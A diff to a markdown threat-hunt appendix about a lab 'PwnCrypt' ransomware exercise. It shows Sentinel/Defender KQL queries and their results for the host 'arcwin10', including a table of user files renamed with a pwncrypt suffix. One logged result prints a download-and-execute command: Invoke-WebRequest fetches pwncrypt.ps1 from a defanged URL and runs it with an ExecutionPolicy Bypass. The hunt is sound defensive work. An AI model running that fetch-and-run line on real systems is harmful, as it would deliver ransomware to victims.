@@ -1,7 +1,16 @@
 ### Project: PwnCrypt Ransomware Project Appendix
 
 #### Summmary:
-This threat hunt was performed in Microsfot Azure and Defender XDR for End-Point. Below you'll see tables used with Sentinel (SIEM), KQL commands, and MITRE ATT&CK® Framework Mapping. 
+This threat hunt was performed in Microsfot Azure and Defender XDR for End-Point. Below you'll see tables used with Sentinel (SIEM), KQL commands, and MITRE ATT&CK® Framework Mapping.
+
+#### Raw event tables used:
+
+| Table Name           | Official Documentation                                                                   |
+| :------------------- | :--------------------------------------------------------------------------------------- |
+| `DeviceNetworkEvents`| [Microsoft Learn Link](https://learn.microsoft.com/en-us/azure/azure-monitor/reference/tables/devicenetworkevents) |
+| `DeviceProcessEvents`| [Microsoft Learn Link](https://learn.microsoft.com/en-us/azure/azure-monitor/reference/tables/deviceprocessevents) |
+| `DeviceEvents`       | [Microsoft Learn Link](https://learn.microsoft.com/en-us/azure/azure-monitor/reference/tables/deviceevents)       |
+| `DeviceFileEvents`   | [Microsoft Learn Link](https://learn.microsoft.com/en-us/azure/azure-monitor/reference/tables/devicefileevents)   |
 
 #### KQL Appendix:
 
@@ -26,7 +35,6 @@ Query Result:
 
 #### Confirming `pwncrypt.ps1` Script Execution on `arcwin10`
 
-After being downloaded, the `pwncrypt.ps1` script was immediately executed. The initial PowerShell instance used `cmd.exe` to launch a new PowerShell process, which ran the script using a policy bypass (`powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1`).
 
 ```kql
 let target_device = "arcwin10";
@@ -51,3 +59,56 @@ Query Result:
 | FileName                    | cmd.exe                                                          |
 | FileSize                    | 289792                                                           |
 | AdditionalFields            | {"DesktopName":"Winsta0\\Default"}                               |
+
+#### Verifying Full PowerShell Command Execution via DeviceEvents
+
+
+```kql
+let target_device = "arcwin10";
+let start_time = datetime(2025-05-10 18:50:00Z); //May 10, 2025 1:50:00 PM CDT
+let end_time = datetime(2025-05-10 19:21:00Z); //May 10, 2025 2:21:00 PM CDT
+DeviceEvents
+| where DeviceName == target_device
+| where Timestamp between (start_time .. end_time )
+| project Timestamp, ActionType, InitiatingProcessSHA1, InitiatingProcessCommandLine, InitiatingProcessAccountName, InitiatingProcessParentFileName, AdditionalFields
+| where ActionType contains "PowerShellCommand"
+| sort by Timestamp asc
+```
+
+Query Result:
+| Field                       | Value                                                              |
+| :-------------------------- | :----------------------------------------------------------------- |
+| Timestamp                   | May 10, 2025 2:01:44 PM                                            |
+| ActionType                  | PowerShellCommand                                                |
+| InitiatingProcessSHA1       | 801262e122d6a2e758962896260d55bbd0136a                           |
+| InitiatingProcessCommandLine| powershell.exe                                                   |
+| InitiatingProcessAccountName| arcanalyst1                                                      |
+| InitiatingProcessParentFileName| explorer.exe                                                    |
+| AdditionalFields            | {"Command":"Invoke-WebRequest -Uri 'hxxps://raw[.]githubusercontent[.]com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt[.]ps1' -OutFile 'C:\\programdata\\pwncrypt.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\\programdata\\pwncrypt.ps1"} |
+
+#### Tracing `pwncrypt.ps1` Ransomware File Renaming Activity
+
+```kql
+let target_device = "arcwin10";
+DeviceFileEvents
+| where DeviceName == target_device
+| where ActionType == "FileRenamed" and FolderPath contains "pwncrypt"
+| project Timestamp, ActionType, FileName, PreviousFolderPath, InitiatingProcessAccountName, InitiatingProcessFileName
+| sort by Timestamp asc
+```
+
+Query Result:
+| Timestamp           | ActionType  | FileName                                   | PreviousFolderPath               | InitiatingProcessAccountName | InitiatingProcessFileName |
+| :------------------ | :---------- | :----------------------------------------- | :------------------------------- | :--------------------------- | :------------------------ |
+| May 10, 2025 2:01:45 PM | FileRenamed | 3546_CompanyFinancials_pwncrypt.csv      | C:\Users\arcanalyst1\Desktop   | arcanalyst1                | powershell.exe          |
+| May 10, 2025 2:01:45 PM | FileRenamed | 6267_ProjectList_pwncrypt.csv            | C:\Users\arcanalyst1\Desktop   | arcanalyst1                | powershell.exe          |
+| May 10, 2025 2:01:45 PM | FileRenamed | 6705_EmployeeRecords_pwncrypt.csv        | C:\Users\arcanalyst1\Desktop   | arcanalyst1                | powershell.exe          |
+| May 10, 2025 3:13:16 PM | FileRenamed | 4362_CompanyFinancials_pwncrypt.csv      | C:\Users\arcanalyst1\Desktop   | system                     | powershell.exe          |
+| May 10, 2025 3:13:16 PM | FileRenamed | 9982_ProjectList_pwncrypt.csv            | C:\Users\arcanalyst1\Desktop   | system                     | powershell.exe          |
+| May 10, 2025 3:13:16 PM | FileRenamed | 4489_EmployeeRecords_pwncrypt.csv        | C:\Users\arcanalyst1\Desktop   | system                     | powershell.exe          |
+| May 10, 2025 7:13:25 PM | FileRenamed | 8270_CompanyFinancials_pwncrypt.csv      | C:\Users\arcanalyst1\Desktop   | system                     | powershell.exe          |
+| May 10, 2025 7:13:25 PM | FileRenamed | 1130_ProjectList_pwncrypt.csv            | C:\Users\arcanalyst1\Desktop   | system                     | powershell.exe          |
+| May 10, 2025 7:13:25 PM | FileRenamed | 4935_EmployeeRecords_pwncrypt.csv        | C:\Users\arcanalyst1\Desktop   | system                     | powershell.exe          |
+| May 10, 2025 11:13:26 PM| FileRenamed | 6642_CompanyFinancials_pwncrypt.csv      | C:\Users\arcanalyst1\Desktop   | system                     | powershell.exe          |
+| May 10, 2025 11:13:26 PM| FileRenamed | 8762_ProjectList_pwncrypt.csv            | C:\Users\arcanalyst1\Desktop   | system                     | powershell.exe          |
+| May 10, 2025 11:13:26 PM| FileRenamed | 8357_EmployeeRecords_pwncrypt.csv        | C:\Users\arcanalyst1\Desktop   | system                     | powershell.exe          |
